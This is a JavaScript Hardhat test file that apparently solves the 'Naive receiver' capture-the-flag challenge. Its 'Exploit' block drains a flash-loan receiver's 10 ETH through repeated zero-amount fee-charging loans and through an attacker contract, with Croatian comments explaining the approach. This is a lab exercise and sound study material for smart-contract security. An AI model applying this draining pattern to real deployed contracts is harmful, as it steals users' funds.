const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Naive receiver', function () {
    let deployer, user, attacker;

    // Pool has 1000 ETH in balance
    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    // Receiver has 10 ETH in balance
    const ETHER_IN_RECEIVER = ethers.utils.parseEther('10');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, user, attacker] = await ethers.getSigners();

        const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
        const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);
        const AttackerBonusSingleTransactionFactory = await ethers.getContractFactory('AttackerBonusSingleTransaction',attacker)

        this.pool = await LenderPoolFactory.deploy();
        await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
        
        expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
        expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));

        this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
        await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
        
        expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);

        this.attackerContract=await AttackerBonusSingleTransactionFactory.deploy(this.pool.address);
    });

    it('Exploit', async function () {
        //POSUDI OD pool CONTRACTA U IME RECEIVERA 0 ETH
        //10 POZIVA -> PLATIT CEMO SVAKI PUT 1 ETHER FEE -> ISPRAZNJEN RACUN
        //MANA OVOG PRISTUPA JE STA RADIMO 10 TRANSAKCIJA 
        //BONUS -> NAPRAVI 1 TRANSKACIJU
        //SITIMO SE -> TRANSKACIJA JE TRANSFER TOKENA ILI TRANSFER ETHA KADA JE SMART CONTRACT POZVAN OD STRANE EOA -> ACCOUNTA KOJI POTPISUJE S PRIVATE KEYEM
        //DEPLOYAMO CONTRACT KOJEM PRISTUPAMO SAMO MI KAO NAPADAČ -> IZ NJEGA POZIVAMO 10 PUTA .flashLoan OD LENDERPOOL CONTRACTA
        //NA OVI NAČIN IMAMO SAMO 1 TRANSAKCIJU NA BLOCKCHAINU->dio di mi pozivamo funkciju na smart contractu -> koji ce bit njeni from,to i value?
        //1. način bez bonusa -> 10 transakcija
        console.log('Pool adress')
        console.log(this.pool.address)
        console.log('Attacker adress')
        console.log(attacker.address)

        for(let i=0;i<10;i++)
        {
            await this.pool.connect(attacker).flashLoan(this.receiver.address,ethers.utils.parseEther('0'))
        }

        //2. način u 1 transakciji pozivamo kao napdac nas contract -> ostatak prepuštamo komunikaciji izmedu 2 smart contracta
        const transhHash=await this.attackerContract.connect(attacker).drainBorrowerFunds(this.receiver.address)
        console.log(transhHash)
        //from=attacker
        //to: adresa contracta
        //value=0

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // All ETH has been drained from the receiver
        expect(
            await ethers.provider.getBalance(this.receiver.address)
        ).to.be.equal('0');
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
    });
});
